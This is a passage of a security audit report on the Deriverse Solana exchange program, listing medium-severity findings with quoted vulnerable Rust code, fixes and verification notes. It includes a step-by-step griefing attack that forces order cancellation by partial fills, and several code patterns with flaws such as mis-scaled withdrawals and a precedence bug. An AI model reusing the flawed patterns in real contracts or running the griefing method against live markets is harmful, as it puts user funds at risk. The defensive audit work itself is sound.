However, in `fee_withdraw`:

```rust
let amount = (data.amount as f64 / dec_factor) as i64;  // Divides by dec_factor
client_community_state.data[crncy_index].fees_prepayment -= amount;  // Subtracts divided value
```

Example with 6 decimals (dec_factor = 1,000,000):
- User deposits 1 token: `fees_prepayment += 1,000,000 (stored as 1,000,000)`
- User withdraws 1 token: `amount = 1,000,000 / 1,000,000 = 1, fees_prepayment -= 1`
- Result: `fees_prepayment = 999,999` instead of `0`

Additional Issues:
- Event logging mismatch: The log events record `data.amount` (raw value), but the actual withdrawal amount is `data.amount / dec_factor`, causing incorrect off-chain accounting
```rust
    solana_program::log::sol_log_data(&[bytemuck::bytes_of::<FeesWithdrawReport>(
        &FeesWithdrawReport {
            tag: log_type::FEES_WITHDRAW,
            client_id: client_state.id,
            token_id: data.token_id,
            amount: data.amount,
            time: clock.unix_timestamp as u32,
            ..FeesWithdrawReport::zeroed()
        },
    )]);
```

**Workaround: The current implementation has a workaround to multiply the original `data.amount` by `dec_factor`, but this must be validated against `SPOT_MAX_AMOUNT` limits.**

**Impact:**
- Off-chain accounting errors: Event logs show incorrect amounts, causing off-chain systems to track wrong values.
- Original Withdrawal Don't Work: Original `fees_withdraw` doesn't work correctly unless a workaround is being applied.

**Recommended Mitigation:** Use `data.amount`consistently:

```rust
   client_community_state.data[crncy_index].fees_prepayment -= data.amount;  // Use raw value
   ...
   client_state.add_crncy_tokens(data.amount)?;  // Use raw value
```

**Deriverse:** Fixed in commit [1dcab9d](https://github.com/deriverse/protocol-v1/commit/1dcab9df3dc962b79c7a6458da810c36d3397f3e).

**Cyfrin:** Verified.

## [M-42] Fee Prepayment Locked Due to Asset Record Cleanup after `fees_deposit`
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** When a user deposits fee prepayment via `fees_deposit`, if the deposit reduces crncy_tokens to zero(right after or later afterwards), the asset record is cleared by `clean_and_check_token_records()`. Later, when the user attempts to withdraw via `fees_withdraw`, the `resolve()` call with `alloc=false` fails to find the asset record, preventing withdrawal of the prepaid fees even though the prepayment amount is still stored in `client_community_state`.

The issue occurs in the following sequence(below is an example):
- In `fees_deposit`: `client_state.sub_crncy_tokens(data.amount)` reduces the currency token balance

```rust
    client_community_state.data[crncy_index].fees_prepayment += data.amount;
    client_state.sub_crncy_tokens(data.amount)?;
```

- In `fees_deposit`: `client_state.clean_and_check_token_records()` is called, which clears asset records when `value == 0`:

```rust
    client_state.clean_and_check_token_records()?;
```

```rust
    pub fn clean_and_check_token_records(&mut self) -> DeriverseResult {
        for r in self.assets.iter_mut() {
            if r.asset_id != 0
                && (r.asset_id & 0xFF000000) != AssetType::SpotOrders as u32
                && (r.asset_id & 0xFF000000) != AssetType::Perp as u32
            {
                match r.value.cmp(&0) {
                    std::cmp::Ordering::Equal => r.asset_id = 0,
                    std::cmp::Ordering::Less => bail!(InsufficientFunds),
                    std::cmp::Ordering::Greater => {}
                }
            }
        }
        Ok(())
    }
```

- In `fees_withdraw`: `client_state.resolve(AssetType::Token, data.token_id, TokenType::Crncy, false)` is called with `alloc=false`

```rust
    client_community_state.update(&mut client_state, &mut community_state, None)?;
    client_state.resolve(AssetType::Token, data.token_id, TokenType::Crncy, false)?;
    let dec_factor = get_dec_factor(community_state.base_crncy[crncy_index].decs_count) as f64;
    let amount = (data.amount as f64 / dec_factor) as i64;
```

- In `find_or_alloc_asset`: When `alloc=false` and the asset record is not found, it returns `AssetNotFound error:`

```rust
        if asset_index == NULL_INDEX {
            realloc = true;
            if !alloc {
                bail!(AssetNotFound {
                    asset_type: asset,
                    id,
                });
            }
```

- The withdrawal fails, even though `fees_prepayment` is still stored in `client_community_state.data[crncy_index].fees_prepayment`

The root cause is that `fees_withdraw` requires `resolve()` to succeed to set the `crncy_tokens` pointer before calling `add_crncy_tokens()`. However, `resolve()` with `alloc=false` cannot recreate the asset record that was cleared after deposit.


**Impact:** Users who deposit fee prepayment that reduces their crncy_tokens to zero(or maybe afterwards) will be unable to withdraw their prepaid fees. They need to deposit again in order to create the `asset`. This requires manual addtional manual operation.

**Recommended Mitigation:** Change `fees_withdraw` to use `alloc=true` when resolving the currency token asset:

```rust
client_state.resolve(AssetType::Token, data.token_id, TokenType::Crncy, true)?;
```

**Deriverse:** Fixed in commit [6662b16](https://github.com/deriverse/protocol-v1/commit/6662b16894ab4462ea9002f355bfd9c9e60784d9).

**Cyfrin:** Verified.

## [M-43] Griefing Attack: Malicious Takers Can Force Order Cancellation by Partial Filling Below Minimum Quantity
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** A malicious taker can exploit the automatic order cancellation mechanism to force makers' orders to be cancelled by intentionally partially filling orders such that the remaining quantity falls below the `min_qty` threshold.

When this occurs, the system automatically cancels the order and refunds the remaining locked funds to the maker. However, since the refunded amount is below `min_qty`, the maker cannot place a new order with these funds, effectively creating a griefing attack that disrupts normal trading operations.

The vulnerability exists in the `fill` function of the spot trading engine . When an order is partially filled (last = true), the system will automatically cancels the order via `erase_client_order(order, node, true, side)`.


```rust
// src/program/spot/engine.rs:1265-1279
if last {
    order.decr_qty(traded_qty).map_err(|err| drv_err!(err))?;
    order.decr_sum(traded_crncy).map_err(|err| drv_err!(err))?;
    order.set_time(self.time);
    if order.qty() < min_qty {  // ⚠️ check
        let node = self.get_node_ptr(order.link(), fill_static_args.side);
        self.erase_client_order(order, node, true, fill_static_args.side)?;
        // ... order is cancelled and funds refunded
    }
}
```

Attack Scenario:
- Maker places an order with quantity 100 tokens, where `min_qty = 2`
- Malicious taker intentionally matches 99 tokens, leaving `1` token remaining
- Since `1 < min_qty (2)`, the system automatically cancels the order
- The remaining `1` token is refunded to the maker via `erase_client_order`
- The maker cannot place a new order with the refunded 1 token because it's below `min_qty`


**Impact:**
- Griefing Attack: Attackers can systematically target orders and force their cancellation by leaving dust amounts below `min_qty`.
- **Refunded amounts below `min_qty` cannot be used to place new orders, effectively locking small amounts of funds**. I think this is not restricted to the order cancellation process, but is throughout the whole repo as it's uncertain how to deal with the dust amount

**Recommended Mitigation:** For this, I have two possible suggestions:
- Prevent Automatic Cancellation on Partial Fill
- Add a way for the user to sell dust amount directly on AMM

**Deriverse:** Fixed in commit [134db8b](https://github.com/deriverse/protocol-v1/commit/134db8b1dac9e48641dac1a6b95bcf34637f695f).

**Cyfrin:** Verified. User's can use market order to deal with tiny amounts

## [M-44] Inconsistent Token Account Address Requirements Between Deposit and Withdraw
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** The `deposit()` and `withdraw()` functions have inconsistent requirements regarding token account addresses:

- **`deposit()`**: Allows deposits from any token account owned by the signer, not requiring an Associated Token Account (ATA)
- **`withdraw()`**: Requires withdrawals to go to the signer's ATA address only


**Deposit Function - No ATA Requirement:**

```rust
// deposit.rs lines 145-154
let old_token = check_spl_token(
    client_associated_token_acc,
    program_token_acc,
    token_state,
    token_program_id,
    mint,
    signer.key,  // Only verifies owner is signer
    &pda,
    data.token_id,
)?;
```

The `check_spl_token()` function (in `helper.rs`) only validates:
- Token account owner is the signer (line 207)
- Mint address matches
- Token program matches

```rust
        if client_token != *mint.key {
            bail!(InvalidMintAccount {
                token_id: token_state.id,
                expected_address: *mint.key,
                actual_address: client_token,
            });
        }

        let client_token_owner = client_token_acc.data.borrow()[32..].as_ptr() as *const Pubkey;

        if *client_token_owner != *signer {
            bail!(DeriverseErrorKind::InvalidTokenOwner {
                token_id: token_state.id,
                address: *client_token_acc.key,
                expected_adderss: *signer,
                actual_address: *client_token_owner,
            });
        }
```

**It does NOT verify the address is an ATA**, meaning users can deposit from any token account they control.

**Withdraw Function - ATA Required:**

```rust
// withdraw.rs lines 127-138
let expected_address = get_associated_token_address_with_program_id(
    signer.key,
    mint_acc.key,
    token_program_id.key,
);
if expected_address != *client_associated_token_acc.key {
    bail!(InvalidAssociatedTokenAddress {
        token_id: token_state.id,
        expected_address: expected_address,
        actual_address: *client_associated_token_acc.key,
    });
}
```

The `withdraw()` function explicitly requires the destination to be the signer's ATA address, rejecting any other token account address.

This works fine with Token-2022, as the owner of a token account is immutable. However, in the legacy token program, a user can transfer ownership of any token account. If a user who deposited funds no longer owns the associated token account, they will not be able to withdraw their funds using the withdraw function since we verify that the ATA owner must be the signer.

Here: https://github.com/solana-program/token/blob/main/program/src/processor.rs#L441

**Impact:** It can cause a loss of user funds. Here is the scenario:
1. The user had an ATA and transferred ownership of that ATA.
2. The user deposited using a different token account.
3. Since the user no longer owns the original ATA, and our logic checks that the ATA owner must match the user, any withdrawal attempt will fail. As a result, the user is unable to withdraw their funds.

**Recommended Mitigation:** Either:
- Make Both Functions Consistent (Require ATA/Allow Any Token Account)
- If the current asymmetry is intentional, clearly document why deposits allow flexibility and withdrawals require ATA.

**Deriverse:** Fixed in commit [1e3d88](https://github.com/deriverse/protocol-v1/commit/1e3d8857266eb82b1920b5edd09009041e96fafe).

**Cyfrin:** Verified.

## [M-45] Incorrect Amount Logged in `Perp Withdraw Report`
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** The `perp_withdraw` function logs the requested amount (`data.amount`) instead of the actual withdrawn amount (`amount`) in the `PerpWithdrawReport` event. This creates a discrepancy between the logged amount and the actual funds transferred, particularly when `data.amount == 0` (withdraw all available funds) or when margin call restrictions apply.

In the `perp_withdraw` function, the actual withdrawal amount is calculated based on various conditions:
```rust
let amount = if margin_call {
    let margin_call_funds =
        funds.min(engine.get_avail_funds(client_state.temp_client_id, true)?);
    if margin_call_funds <= 0 {
        bail!(ImpossibleToWithdrawFundsDuringMarginCall);
    }
    if data.amount == 0 {
        margin_call_funds  // Actual amount may differ from data.amount
    } else {
        // ... validation logic ...
        data.amount
    }
} else if data.amount == 0 {
    funds  // Actual amount may differ from data.amount
} else {
    // ... validation logic ...
    data.amount
};
```

The actual funds are transferred using the calculated `amount` variable :

```rust
client_state.add_crncy_tokens(amount)?;
client_state
    .perp_info()?
    .sub_funds(amount)
    .map_err(|err| drv_err!(err))?;
```

However, the log entry records `data.amount` instead of the actual `amount`:

```rust
solana_program::log::sol_log_data(&[bytemuck::bytes_of::<PerpWithdrawReport>(
    &PerpWithdrawReport {
        tag: log_type::PERP_WITHDRAW,
        client_id: client_state.id,
        instr_id: data.instr_id,
        amount: data.amount,  // ❌ Should be: amount
        time: ctx.time,
        ..PerpWithdrawReport::zeroed()
    },
)]);
```

**Impact:** Logs do not reflect actual withdrawals, complicating accounting.


**Recommended Mitigation:** Update the log entry to record the actual withdrawn `amount`.

**Deriverse:** Fixed in commit [2a0fe33](https://github.com/deriverse/protocol-v1/commit/2a0fe336bb2a13bb3e96e1f065b907bc2d3e31bf).

**Cyfrin:** Verified.

## [M-46] Incorrect Margin Call State Detection After Liquidation in `perp_withdraw`
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** In perp_withdraw, the margin call state is incorrectly determined after executing liquidation checks. The function calls `check_long_margin_call()` and `check_short_margin_call()` first which may successfully liquidate positions, but then checks the `margin_call` state using `is_long_margin_call()` and `is_short_margin_call()`. Since these check functions examine the current highest-risk node in the tree (which may have changed after liquidation), they can return `false` even when liquidation has just occurred, leading to incorrect withdrawal amount calculations.

The issue occurs in `src/program/processor/perp_withdraw.rs`:

```rust
engine.check_long_margin_call()?;
engine.check_short_margin_call()?;
let margin_call = engine.is_long_margin_call() || engine.is_long_margin_call();
```

The Problem:
- Liquidation Execution: `check_long_margin_call` iterates through the `long_px` tree, finds high-risk positions(`max_node`), and liquidates them. When a position is successfully liquidated, it calls `change_edge_px(temp_client_id)`, which removes or updates the node in the tree.

```rust
                    let (_, t, _) = self.match_bid_orders(
                        None,
                        &MatchOrdersStaticArgs {
                            price: margin_call_px,
                            qty: info.perps,
                            ref_discount: 0f64,
                            ref_ratio: 0f64,
                            ref_expiration: 0,
                            ref_client_id: ClientId(0),
                            client_id: temp_client_id,
                            trades_limit: MAX_MARGIN_CALL_TRADES - trades,
                            margin_call: true,
                        },
                    )?;
                    self.check_funding_rate(temp_client_id)?;
                    self.change_edge_px(temp_client_id); // <= here
```

```rust
        if info2.px_node != NULL_NODE {
            if info2.mask & 0x80000000 == 0 {
                let node: NodePtr<i128> =
                    unsafe { NodePtr::get(self.long_px.entry, info2.px_node) };
                self.long_px.delete(node);
            } else {
                let node: NodePtr<i128> =
                    unsafe { NodePtr::get(self.short_px.entry, info2.px_node) };
                self.short_px.delete(node);
            }
        }
```

- State Check After Liquidation: After liquidation, `is_long_margin_call()` checks the current `max_node()` in the `long_px` tree. However, this node may be different from the one that was just liquidated. And could have different liquidation status.

```rust
    pub fn is_long_margin_call(&self) -> bool {
        let root = self.long_px.get_root::<i128>();
        if root.is_null() {
            false
        } else {
            ((self.state.header.perp_underlying_px as f64
                / (1.0 + self.state.header.liquidation_threshold)) as i64)
                < (root.max_node().key() >> 64) as i64
        }
    }
```

False Negative Scenario:
- Node A is the highest-risk node (`px > margin_call_px`)
- `check_long_margin_call` successfully liquidates Node A
- Node A is removed/updated via `change_edge_px`
- The loop continues and checks Node B
- If Node B's `px <= margin_call_px`, the loop breaks
- `is_long_margin_call` checks Node B and returns false
But liquidation has already occurred(for Node A), so the system should be considered in a margin call state

If liquidation occurred but `margin_call` is incorrectly set to `false`, the withdrawal calculation uses the normal path instead of the margin call path, causing incorrect `amount` calculation.

```rust
    let amount = if margin_call {
        let margin_call_funds =
            funds.min(engine.get_avail_funds(client_state.temp_client_id, true)?);
        if margin_call_funds <= 0 {
            bail!(ImpossibleToWithdrawFundsDuringMarginCall);
        }
        if data.amount == 0 {
            margin_call_funds
        } else {
            if margin_call_funds < data.amount {
                if funds >= data.amount {
                    bail!(ImpossibleToWithdrawFundsDuringMarginCall);
                }
                bail!(InsufficientFunds);
            }
            data.amount
        }
    } else if data.amount == 0 {
        funds
    } else {
        if funds < data.amount {
            bail!(InsufficientFunds);
        }
        data.amount
    };
```

Also, `check_rebalancing` is unnecessarily called.
```rust
    if !margin_call {
        engine.check_rebalancing()?;
    }
```

**Impact:** If liquidation occurred but `margin_call` is incorrectly set to false, the function would behave different according to `margin_call`.

**Recommended Mitigation:** Check Return Values: `check_long_margin_call` and `check_short_margin_call` return the number of trades executed. Use these return values to determine if liquidation occurred.


**Deriverse:** Fixed in commit [74f9650](https://github.com/deriverse/protocol-v1/commit/74f9650ef966b422d95a384bb1e39f4f7bd9cf22).

**Cyfrin:** Verified.

## [M-47] Incorrect mask check in `check_points` function
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** The `check_points` function uses an incorrect bitmask(0x7FF) to determine whether milestone points should be checked. This mask covers bits 0–10, but it should check for bits 0, 1, 2, 9, 10, 11, 12, and 13. As a result, the function incorrectly evaluates the condition even when the user has already received all eight points.

```rust
if self.mask & 0x7FF != 0x7FF {
```

**Impact:** The mask value 0x7FF was intended to optimize the function by skipping checks when all milestones are achieved, but it does not work correctly.

**Recommended Mitigation:** We should check against 0x3E07. If (mask & 0x3E07) != 0x3E07 is false, then we should skip the point checks.
```rust
            if self.mask & 0x3E07 != 0x3E07 {
```

**Deriverse:** Fixed in commit [3ffcaa](https://github.com/deriverse/protocol-v1/commit/3ffcaadf2fb7210a0215d5c482a4c10a1bb77299).

**Cyfrin:** Verified.



\clearpage

## [M-48] Inefficient `free_index` Selection in Assets Array Causes Performance Degradation
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** The `find_or_alloc_asset` function in `client_primary` always selects the last vacant slot (`asset_id == 0`) instead of the first available slot when allocating new assets. This causes unnecessary `O(n)` iterations, space fragmentation, and potential compute budget exhaustion as the assets array grows.

In `client_primary`, the loop logic is:

```rust
for (i, a) in self.assets.iter().enumerate() {
    let current_id = a.asset_id;
    if current_id == asset_id {
        asset_index = i;
        break;
    } else if current_id == 0 {
        free_index = i;  // Always overwrites with the last vacant slot
    }
}
```

`free_index` is continuously overwritten whenever a vacant slot (`asset_id == 0`) is found, meaning it will always contain the index of the last vacant slot in the array, not the first.

Example scenario:
- Array state: `[asset1, 0, asset2, 0, asset3]`
- When searching for a non-existent `asset4`
- The loop traverses all 5 elements
- `free_index` is set to index `1` (first 0), then overwritten to index `3` (last 0)
- The first vacant slot at index `1` remains unused

**Impact:** Later in the search, every lookup could requires full O(n) traversal even when vacant slots exist early in the array

**Recommended Mitigation:** `free_index` could only be overwritten when it is `NULL_INDEX`, thus we are always returning and using the first vacant slot.

**Deriverse:** Fixed in commit [30e062e](https://github.com/deriverse/protocol-v1/commit/30e062e9f393bfdcf9a510cd2da71237d5db9d20).

**Cyfrin:** Verified.

## [M-49] Inefficient rebalancing can cause the loss of users
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** We can only call rebalance once every 5 minutes. This is enforced through the `check_rebalancing` function, which allows only 25 rebalancing calls each time it runs. This limitation can create significant issues.

For example, if there are 200,000 open positions and `check_rebalancing` is triggered whenever a user performs a perp-related action, we would need roughly 8,000 user-triggered calls every 5 minutes to rebalance all positions. If the number of user actions is lower, many positions will not be rebalanced in time.

This can result in positions being rebalanced too late, which may lead to improper liquidations(early or late liquidation) and potentially increase socialized losses for other users.

**Impact:** This limitation can lead to positions not being rebalanced until much later if perp-related transactions are very low, which can result in improper liquidations.

**Recommended Mitigation:** Implement a function that can be called to rebalance user positions every 5 minutes.

**Deriverse:** Fixed in commit [7873db](https://github.com/deriverse/protocol-v1/commit/7873db50be8fc7298817e097d0f55bf165ceae04), [76dbbe](https://github.com/deriverse/protocol-v1/commit/76dbbec20fdd2e09fa5722e993da897bf0da2f8b).

**Cyfrin:** Verified.

## [M-50] Margin call uses stale edge price
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** The `check_long_margin_call` and `check_short_margin_call` functions determine whether positions should be liquidated based on edge prices retrieved from the price trees before applying funding rate updates and rebalancing. This causes positions to be liquidated using stale edge prices that don't reflect the current state after funding rate changes, leading to unfair liquidations.

`check_funding_rate` and `check_soc_loss` are called after the liquidation decision is made, but these functions can modify the user’s funds, which directly affects whether liquidation should occur.

```rust
pub fn check_long_margin_call(&mut self) -> Result<i64, DeriverseError> {
    let mut trades = 0;
    let margin_call_px = (self.state.header.perp_underlying_px as f64
        * (1.0 - self.state.header.liquidation_threshold)) as i64;

    loop {
        let root = self.long_px.get_root::<i128>();
        if root.is_null() || trades >= MAX_MARGIN_CALL_TRADES {
            break;
        }
        let node = root.max_node();
        let px = (node.key() >> 64) as i64;  // Gets stale edge price

        if px > margin_call_px {  // Decision made with stale price
            let temp_client_id = ClientId(node.link());

            // Funding rate checked AFTER liquidation decision
            self.check_funding_rate(temp_client_id)?;
            self.check_soc_loss(temp_client_id)?;

            // ... liquidation logic ...

            // Edge price updated AFTER liquidation
            self.change_edge_px(temp_client_id);
        }
    }
}
```


**Impact:** Users may be liquidated when they should not be, resulting in unnecessary loss of funds.

**Recommended Mitigation:** Consider using the updated edge price, after applying the `check_funding_rate` and `check_soc_loss` to determine whether the position should be liquidated.

**Deriverse:** Fixed in commit [1efef6](https://github.com/deriverse/protocol-v1/commit/1efef63dfea11c8e031d1fe1fb0b48875a856153).

**Cyfrin:** Verified.

## [M-51] Missing Update of `perp_spot_price_for_withdrowal` in `perp_withdraw` Function
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** The `perp_withdraw` function fails to update the `perp_spot_price_for_withdrowal` field(including `perp_long_spot_price_for_withdrowal` and `perp_short_spot_price_for_withdrowal` in later commits) when there is no margin call, while other similar functions (`new_perp_order` and `perp_quotes_replace`) properly update this field. This inconsistency can lead to stale price data being used in subsequent margin call scenarios, potentially affecting withdrawal calculations.

The `perp_spot_price_for_withdrowal` field is used by the `get_avail_funds` function when calculating available funds during margin call situations. The field should be updated to the current `perp_underlying_px` when there is no margin call to ensure accurate calculations in future operations.

We can see that in `new_perp_order` and `perp_quotes_replace`:

```rust
    if !long_margin_call {
        engine.state.perp_long_spot_price_for_withdrowal = engine.state.perp_underlying_px;
    }
    if !short_margin_call {
        engine.state.perp_short_spot_price_for_withdrowal = engine.state.perp_underlying_px;
    }
```

Now, in `perp_withdraw`, we are having:

```rust
let margin_call = engine.is_long_margin_call() || engine.is_long_margin_call();
if !margin_call {
    engine.check_rebalancing()?;
}
```

**Impact:** The `perp_spot_price_for_withdrowal` field(including `perp_long_spot_price_for_withdrowal` and `perp_short_spot_price_for_withdrowal` in later commits) may retain stale values if `perp_withdraw` is called without a margin call, while other functions update it. If a margin call occurs after a `perp_withdraw` operation (in the same transaction or subsequent transactions), the `get_avail_funds` function may use an outdated price when `margin_call=true`, leading to incorrect available funds calculations.

**Recommended Mitigation:** Add the missing update to maintain consistency and price up-to-date.

**Deriverse:** Fixed in commit [66c878](https://github.com/deriverse/protocol-v1/commit/66c878370dc8041d6544b8fdee636102ce00fe8c).

**Cyfrin:** Verified.

## [M-52] Operator precedence Issue during points program expiration validation in `change_points_program_expiration`
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** In `change_points_program_expiration`, the validation for `new_expiration_time` uses `!data.new_expiration_time < root_state.points_program_expiration` instead of `!(data.new_expiration_time < root_state.points_program_expiration)`, causes unintended behavior.

```rust
if !data.new_expiration_time < root_state.points_program_expiration {
    bail!(InvalidNewExpirationTime {
        program_name: "Points Program".to_string(),
        new_time: data.new_expiration_time,
        old_time: root_state.points_program_expiration
    });
}
```
This occurs because the bitwise NOT operator has higher precedence than the less-than comparison operator(`<`). This causes the expression to be evaluated as:
```rust
(!data.new_expiration_time) < root_state.points_program_expiration
```
Instead of the intended:
```rust
!(data.new_expiration_time < root_state.points_program_expiration)
```

**Impact:** Using the `change_points_program_expiration` function, we cannot decrease the points program expiration because applying `!` to a `u32` performs a bitwise NOT operation. This produces a value close to `u32::MAX`, which is almost always greater than any reasonable expiration time when attempting to reduce `points_program_expiration`.

**Recommended Mitigation:** Use `!(data.new_expiration_time < root_state.points_program_expiration)` during validation, here's the fix:
```rust
    if !(data.new_expiration_time < root_state.points_program_expiration){
        bail!(InvalidNewExpirationTime {
            program_name: "Points Program".to_string(),
            new_time: data.new_expiration_time,
            old_time: root_state.points_program_expiration
        });
    }
```

**Deriverse:** Fixed in commit [eae149](https://github.com/deriverse/protocol-v1/commit/eae1494725cf3ebdc5800fa39bb80b6c90c62478).

**Cyfrin:** Verified.

## [M-53] Redundant Flag `READY_TO_DRV_UPGRADE` Appears Unused
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** The `READY_TO_DRV_UPGRADE` flag appears to be redundant and potentially dead code. It is always set together with `READY_TO_PERP_UPGRADE`, but there is no separate DRV upgrade functionality in the codebase. The flag is never independently checked or used, suggesting it may be leftover code from a planned feature that was never implemented or was removed.

## Vulnerability Details

The codebase defines two flags for instrument upgrade:
1. `READY_TO_PERP_UPGRADE` - indicates readiness for perpetual upgrade
2. `READY_TO_DRV_UPGRADE` - indicates readiness for DRV upgrade (purpose unclear since it's never shown in the code)

**Analysis:**

1. **No separate DRV upgrade functionality exists:**
   - In the codebase, there's no `upgrade_to_drv` function or `UpgradeToDrvInstruction`
   - The only upgrade function is `upgrade_to_perp`

2. **Flags are always set together:**
   - In `set_instr_ready_for_perp_upgrade`, both flags are set:
   ```rust
   instr_header.mask |= instr_mask::READY_TO_PERP_UPGRADE;
   instr_header.mask |= instr_mask::READY_TO_DRV_UPGRADE;
   ```

   - In `update_variance`, both flags are set together:
   ```rust
   self.mask |= instr_mask::READY_TO_DRV_UPGRADE;
   self.mask |= instr_mask::READY_TO_PERP_UPGRADE;
   ```

3. However, **`READY_TO_DRV_UPGRADE` is never independently checked:**
   - In `upgrade_to_perp` (line 148-150), only `READY_TO_PERP_UPGRADE` is checked:
   ```rust
   if instr_header.mask & instr_mask::READY_TO_PERP_UPGRADE == 0
       || instr_header.mask & instr_mask::PERP != 0
   ```
   - `READY_TO_DRV_UPGRADE` is **never checked** in any upgrade function

4. **Only used in `update_variance` with AND logic:**
   - In `update_variance` (line 51-52), both flags are checked together:
   ```rust
   if self.mask & instr_mask::READY_TO_DRV_UPGRADE == 0
       && self.mask & instr_mask::READY_TO_PERP_UPGRADE == 0
   ```
   - Since they're always set together, checking both is redundant

**Impact:** **Dead Code / Redundancy**: `READY_TO_DRV_UPGRADE` appears to serve no purpose since:
   - There is no DRV upgrade functionality
   - It's always set together with `READY_TO_PERP_UPGRADE`
   - It's never independently checked or used

**Recommended Mitigation:** Remove the flag entirely if DRV upgrade is not planned.

**Deriverse:** Fixed in commit [75da0c](https://github.com/deriverse/protocol-v1/commit/75da0cddb50f53240b8221dde055453a57495e0f).

**Cyfrin:** Verified.

## [M-54] Referrer cannot be set after account creation
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** The referral system has a critical limitation, users can only set a referrer during their **first deposit call** when creating a new account. There is no function to set or update a referrer after account creation, which creates several problems:

1. **First user cannot refer anyone**: The first user who creates an account cannot refer anyone because:
   - They can create referral links via `new_ref_link`, but
   - They cannot set a referrer during their own first deposit because there is no other user
   - There is no function to set a referrer after the first deposit

2. **Users who missed setting a referrer cannot set one later**: Users who did not provide a `ref_id` during their first deposit cannot set a referrer in subsequent deposits because the referrer setting logic only executes during account creation.

**Impact:**
1. **First User Problem**: The very first user to create an account cannot refer anyone, even though they can create referral links. This breaks the referral program for early adopter.

2. **Permanent Limitation**: Users who forgot to include a `ref_id` during their first deposit are permanently locked out of the referral program.

**Recommended Mitigation:** Create a new instruction `set_referrer` that allows users to set a referrer after account creation (with appropriate restrictions, e.g., only if `ref_address` is currently unset).

**Deriverse:** Fixed in commit [993cf7](https://github.com/deriverse/protocol-v1/commit/993cf75f48a34aaae99421093ce59cb4f5e61f6b).

**Cyfrin:** Verified.

## [M-55] Stale edge price in liquidation tree after perp withdraw call
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** In `perp_withdraw`, after withdrawing funds from a perpetual position, the function does not call `change_edge_px` to update the liquidation price(edge price) in the liquidation tree.

When funds are withdrawn, `info.funds` decreases, which affects `total_funds` and consequently the edge price. However, the liquidation trees(`long_px` and `short_px`) continue to store the outdated edge price because `change_edge_px` is never invoked.

**Impact:** After a withdrawal, the liquidation trees retain stale edge prices because `change_edge_px` is never called. This leads to incorrect margin call detection and liquidation priority.


**Recommended Mitigation:** `change_edge_px` should be invoked for the user withdrawing funds at the end of the function.

**Deriverse:** Fixed in commit [4f7bc8](https://github.com/deriverse/protocol-v1/commit/4f7bc8ac68325aa93b339ff91c0ac794ea17ffd9).

**Cyfrin:** Verified.

## [M-56] User cannot claim dividends after withdrawing their DRVS tokens
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** In `dividends_claim`, the function checks that `client_community_state.header.drvs_tokens` is greater than zero for the user to be eligible to claim their dividend tokens.

```rust
    if client_community_state.header.drvs_tokens > 0 {
        let clock = Clock::get().map_err(|err| drv_err!(err.into()))?;
        let slot = clock.slot as u32;
        for (d, b) in client_community_state
            .data
            .iter_mut()
            .zip(community_state.base_crncy.iter_mut())
        {
            client_state.resolve(AssetType::Token, b.crncy_token_id, TokenType::Asset, true)?;
            let amount = ((((b.rate - d.dividends_rate)
                * client_community_state.header.drvs_tokens as f64)
                as i64)
                + d.dividends_value)
                .min(b.funds)
                .max(0);
            client_state.add_asset_tokens(amount)?;
            b.funds -= amount;
            d.dividends_rate = b.rate;
            d.dividends_value = 0;
            solana_program::log::sol_log_data(&[bytemuck::bytes_of::<EarningsReport>(
                &EarningsReport {
                    tag: log_type::EARNINGS,
                    client_id: client_state.id,
                    amount,
                    token_id: b.crncy_token_id,
                    time: clock.unix_timestamp as u32,
                    ..EarningsReport::zeroed()
                },
            )]);
        }
        client_state.header.try_upgrade()?.slot = slot;
    }
```
Our current design allows a user to withdraw their DRVS tokens without claiming dividends. This means that if the user sells their tokens after withdrawing, they will not be able to claim dividends until they deposit some DRVS tokens again.

**Impact:** User will not be able to claim their `dividends_value` even if it is greater than zero, unless their DRVS deposit is also greater than zero.


**Recommended Mitigation:** Allow claiming the dividend value even when `client_community_state.header.drvs_tokens` is zero.

**Deriverse:** Fixed in commit [4dba9d](https://github.com/deriverse/protocol-v1/commit/4dba9dcc728fc78594f75aea086431b385fcb6f3).

**Cyfrin:** Verified.

## [M-57] User's chosen leverage is overwritten to `max-leverage` on every perp operation
- Severity: `Medium`
- Source report: `dex.md`

### Detailed Content (from source)
**Description:** In `client_primary.rs]`, the [new_for_perp](https://github.com/deriverse/protocol-v1/blob/30b06d2da69e956c000120cdc15907b5f33088d7/src/state/client_primary.rs#L344) function unconditionally sets the user's leverage on every call, regardless of whether the `alloc` parameter is true or false.
```rust
    let mut client_state = ClientPrimaryState::new_for_perp(
        program_id,
        client_primary_acc,
        &ctx,
        signer,
        system_program,
        0, //always passed as zero
        false,
        true,
    )?;
```
When [leverage = 0](https://github.com/deriverse/protocol-v1/blob/30b06d2da69e956c000120cdc15907b5f33088d7/src/state/client_primary.rs#L470) is passed (which happens in most perp operations like `perp_withdraw`, `perp_deposit`, `perp_mass_cancel`, `perp_order_cancel`, `perp_quotes_replace`, `perp_statistics_reset`, `buy_market_seat`, `sell_market_seat`), the code sets the user's leverage to `max_leverage`.

```rust
if leverage > 0 {
    //clear and set
    unsafe {
        (*state.perp_info2).mask &= 0xFFFFFF00;
        (*state.perp_info2).mask |= (leverage as u32).min(header.max_leverage as u32);
    }
} else {
    // When leverage == 0, sets to max_leverage (always by default)
    unsafe {
        (*state.perp_info2).mask &= 0xFFFFFF00;
        (*state.perp_info2).mask |= header.max_leverage as u32;
    }
}
Ok(state)
```
consider this scenario:
1. User calls perp_change_leverage(5) to set their leverage to 5x
